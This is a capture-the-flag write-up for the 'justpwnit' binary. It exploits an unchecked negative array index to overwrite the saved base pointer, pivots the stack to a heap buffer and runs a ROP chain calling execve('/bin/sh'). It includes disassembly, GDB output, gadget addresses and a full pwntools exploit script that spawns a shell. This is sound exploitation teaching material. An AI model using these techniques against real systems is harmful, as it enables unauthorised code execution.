# Justpwnit Writeup 

## Introduction

This problem provides a binary and source code for a program which creates an array of 4 elements and passes it 4 times to a function which is suppose to set the Nth element. 

``` C
void justpwnit() {
  char *array[4];
  for (int i = 0; i < 4; i++) {
    set_element(array);
  }
}
```

The Nth element is then set to a char* "data" which is allocated on the heap. Issues arrise when the program allows the user to choose which element in the array they want to set without checking the bounds of the index passed in. This allows the user to overflow any 8 bytes on the stack with the address allocated for data.

``` C
void set_element(char **parray) {
  int index;
  printf("Index: ");
  if (scanf("%d%*c", &index) != 1)
    exit(1);
  if (!(parray[index] = (char*)calloc(sizeof(char), STR_SIZE)))
    exit(1);
  printf("Data: ");
  if (!fgets(parray[index], STR_SIZE, stdin))
    exit(1);
}
```

The program also takes the user's input for the data section, which combined with the overflow can yeild a nice exploit. 

## Explotation Step 1: Stack Overflow

The first thing that comes to mind when dealing with an overflow is overwritting the saved return address. Initially it would seem that the conditions are perfect to do so, but looking slightly closer at the problem reveals that it is not possible. This is because the overwrite address lives on the heap, which is non executable and would cause the program to crash if it returned to an instruction in that section of memory. However, there is still another way to subvert code execution flow of the program by overriding the saved base pointer. Understanding how the stack works, when a function returns with "leave ret" the current base pointer is moved to RSP, the saved base pointer is popped off the top of the stack into RBP, and the saved return address (now the top of the stack) gets popped into RIP where execution continues. Since RBP will eventually be moved into RSP, if RBP is overwritten, RSP can be user controlled after the function with that base pointer returns. 

Before demonstarting this concept, the proper index must be provided to the program to ensure RBP is overwritten. To find this, the program can be run in GDB to examine memory or disassembled. Ideally RSP will be controlled when justpwnit() returns, meaning the saved base pointer in the set_element() stack frame will need to be overwritten. This is no problem since the program asks for an index in the set_element() function. However, it is important to remember that the array is stored in the previous stack frame so negative indexes will be used to direct the program where to write the heap address. To use negative indexes the program must be using a signed integer as the indexer; this is true in this case since the int type is signed by default. 

<pre><code>
   0x000000000040120e <+0>:     endbr64 
   0x0000000000401212 <+4>:     push   rbp
   <b>0x0000000000401213 <+5>:     mov    rbp,rsp</b>
   <b>0x0000000000401216 <+8>:     sub    rsp,0x30</b>
   0x000000000040121a <+12>:    mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000401221 <+19>:    jmp    0x401233 <justpwnit+37>
   <b>0x0000000000401223 <+21>:    lea    rax,[rbp-0x30</b>
   <b>0x0000000000401227 <+25>:    mov    rdi,rax</b>
   <b>0x000000000040122a <+28>:    call   0x401139 <set_element></b>
   0x000000000040122f <+33>:    add    DWORD PTR [rbp-0x4],0x1
   0x0000000000401233 <+37>:    cmp    DWORD PTR [rbp-0x4],0x3
   0x0000000000401237 <+41>:    jle    0x401223 <justpwnit+21>
   0x0000000000401239 <+43>:    nop
   0x000000000040123a <+44>:    nop
   0x000000000040123b <+45>:    leave  
   0x000000000040123c <+46>:    ret    
</code></pre>

The disassembly of jstpwnit() shows that RSP is subtracted by 0x30, which is the same address that gets loaded into RDI as the argument to set element (bolded lines above). Using this knowledge it can be determined that the first element of the array starts at the top of the stack. This is significant becasue as set_element() gets called, the next stack frame is set up directly above the array. After the call, the saved ip is pushed and the saved base pointer right after for a total distance of -16 bytes from the start of the array. This then translates to -2 as the array index since the array type is char* and a pointer is 8 bytes. 

This can be seen in GDB (Putting all As as the data better show where the heap address is):

<pre><code>
gef➤  r                                                                                                                                                                                                    
Starting program: /home/guac/ctf/asis/jst_pwn_it/justpwnit/justpwnit                                                                                                                                       
<b>Index: -2 </b>                                                                                                                                                                                                 
Data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                                                                                                                                                   
Breakpoint 1, 0x0000000000401206 in set_element ()
──stack ────
0x00007fffffffdf70│+0x0000: 0x0000000000000000   ← $rsp
0x00007fffffffdf78│+0x0008: 0x00007fffffffdfb0  →  0x00000000000000b4
0x00007fffffffdf80│+0x0010: 0x0000000000000000
0x00007fffffffdf88│+0x0018: 0xfffffffe00403d3f ("?=@"?)
0x00007fffffffdf90│+0x0020: 0x0000000000000000
0x00007fffffffdf98│+0x0028: 0x000000000040123d  →  <main+0> endbr64 
<b>0x00007fffffffdfa0│+0x0030: 0x00007ffff7ff8050  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"  ← $rbx, $rbp</b>
0x00007fffffffdfa8│+0x0038: 0x000000000040122f  →  <justpwnit+33> add DWORD PTR [rbp-0x4], 0x1
</code></pre>

With index -2 the saved base pointer is now pointing to the allocated heap address!

## Explotation Step 2: ROP Chaining

Since the saved base pointer in set_element() is set to the user controlled heap address; this address will be popped into RBP when set_element() returns; then moved to RSP when justpwnit() returns. As a result of the instruction ```mov rsp, rbp``` happening directly before  ```pop rip```, the stack pointer is now pointing to the user controlled heap address when RIP gets popped. The user now has controll of what gets popped into RIP. To explot this, a rop chain can be created and the user can provide RIP addresses to arbitrarily execute any code within the binary. For this demonstaration the rop chain will set up and execute the syscall execve("/bin/sh") to spawn a shell. The next step is to find useful instructions in the binary ending with the ret instruction (ROP gadgets) so the chain may continue. Finding gadgets can be done manually by dumping the disassembly of the program and greppping for instructions, or it can be done using tools. The r++ tool used here and can be found at https://github.com/zardus/ctf-tools/tree/master/rp%2B%2B. To set up the syscasll, RAX must have the valaue 0x3b (execve syscall num), RDI will have a char* pointing to "/bin/sh\x00" (\x00 is at the end to make it an 8 byte value and null terminated), and RSI will be zeroed out along with RDX. In order to get a pointer to "/bin/sh" into RDI, the string must be written to a writable memory address, which can then be popped into RDI. Finding a writable memory address can simply be done by reading the elf file section headers, and finding an address with W (write) permissions. 

``` 
$ readelf -S justpwnit
[1] ...
.
.
[11] .data             PROGBITS         000000000040c020  0000b020
       0000000000000210  0000000000000000  WA       0     0     32
[12] .bss              NOBITS           000000000040c240  0000b230
       0000000000000e98  0000000000000000  WA       0     0     32
```
Here both the .data and .bss sections are writeable and have an accessible address. Once the address is found, a gadget is needed to move the string to the memory. 

``` 
$ ./bin/rp++ -f justpwnit -r 2 --unique | grep "mov qword"
0x00401ce7: mov qword [rdi], rax ; ret  ;  (1 found)
```

R++ found the gadget ```mov qword [rdi], rax```, so the exploit will pop the writable address to RDI, pop "/bin/sh" into RAX, and then execute the above instruction to move the string into memory. Setting the remaining register values can be achieved by finding ROP gadgets that pop the aformentioned registers, then placing the desired value of the register directly below the address of the gadget. When the instruction address is popped into RIP and executed, the desired value is at the top of the stack and the gadget will pop it into the given register. Using r++, it is simple to find gadgets for popping RAX, RDI, RSI, and RDX, as well as finding a syscall instruction. 

``` 
 $ ./bin/rp++ -f ./justpwnit -r 2 --unique | grep "pop rax"
 0x00401001: pop rax ; ret  ;  (2 found)
 $ ./bin/rp++ -f ./justpwnit -r 2 --unique | grep "pop rdi"
 0x00401b0d: pop rdi ; ret  ;  (13 found) 
 $ ./bin/rp++ -f ./justpwnit -r 2 --unique | grep "pop rsi"
 0x004019a3: pop rsi ; ret  ;  (2 found)
 $ ./bin/rp++ -f ./justpwnit -r 2 --unique | grep "pop rdx"
 0x00403d23: pop rdx ; ret  ;  (7 found)
 $ ./bin/rp++ -f ./justpwnit -r 2 --unique | grep "syscall"
 0x004013e9: syscall ; (30 found)
 ```

The stack will look like this:
<center>

| Stack |
| ----------------------- |
| pop rdi: 0x401b0d |
| writeable address: 0x40c240 |
| pop rax: 0x401001 |
| shell string: "/bin/sh\x00" | 
| mov qword [rdi], rax: 0x401ce7 |
| pop rax: 0x401001 |
| excecv syscall num: 0x3b |
| pop rsi: 0x4019a3 |
| 0x00000000 |
| pop rdx: 0x403d23 |
| 0x00000000 |
| syscall: 0x4013e9 |

</center>

## Explotation Step 3: Crafting The Exploit 

Now that the ROP gadgets have been found and are in the correct order, the final step in getting to a shell is crafting the exploit. Pwntools will be used to easily interact with the program and send it our payload. First variables are created to store gadget addresses, the syscall num, the shell string, and 0. They are all packed into little endian byte format with pwn.p64(). The payload is then created by concatenating the gadgets into the correct order. Finally, the process is created by using pwn.process(), the index -2 and the payload are sent to the process using process.sendline(), and the user is able to interact with the shell through pwntools using process.interactive().

Here is the full exploit:

``` python
import pwn
import sys

# Order of rop gadgets on stack
# | pop rdi:                     0x401b0d
# | writeable address            0x0x40c240
# | pop rax                      0x401001
# | shell string:                "/bin/sh\x00"
# | mov qword [rdi], rax:        0x401ce7
# | pop rax:                     0x401001
# | excecv syscall num:          0x3b
# | pop rsi:                     0x4019a3
# | 0                            0x0
# | pop rdx:                     0x403d23
# | 0                            0x0
# | syscall:                     0x4013e9

# Packed rop gadgets, syscall num, shell string, and 0s
syscall_num = pwn.p64(0x3b)
writeable_addr = pwn.p64(0x40c240)
shell_string = b'/bin/sh\x00'
zero = pwn.p64(0x0)
pop_rax = pwn.p64(0x401001)
pop_rdi = pwn.p64(0x401b0d)
pop_rsi = pwn.p64(0x4019a3)
pop_rdx = pwn.p64(0x403d23)
mov_rax_rdi_addr = pwn.p64(0x401ce7)
syscall = pwn.p64(0x4013e9)

# Payload
pld = zero + pop_rdi + writeable_addr + pop_rax + shell_string + mov_rax_rdi_addr + pop_rax + syscall_num + pop_rsi + zero + pop_rdx + zero + syscall

# Creates process, sends payload, and switches to interactive mode
def ptools():
    p = pwn.process("./justpwnit")
    p.sendline('-2')
    p.sendline(pld)
    p.clean()
    p.interactive()

# Writes payload to file "exp"
def write_to_exp():
    with open("exp", "wb") as f:
        f.write(b"-2\n")
        f.write(pld)

# Runs GDB with pwntools
def p_debug():
    p = pwn.process("./justpwnit")
    pwn.gdb.attach(p)
    p.sendline('-2')
    p.sendline(pld)

# No arguments runs the exploit and switches to interactive
# -g runs the process with gdb 
# Any other argument will write the payload to the file "exp"
if len(sys.argv) > 1:
    if sys.argv[1] == '-g':
        p_debug()
    else:
        write_to_exp()
else:
    ptools()
```

Here is the exploit getting shell:
``` 
 python3 ./exploit.py 
[+] Starting local process './justpwnit': pid 6741
./exploit.py:33: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline('-2')
[*] Switching to interactive mode
$ echo hi
hi
$  
```

## Author: Joaquin Frommer
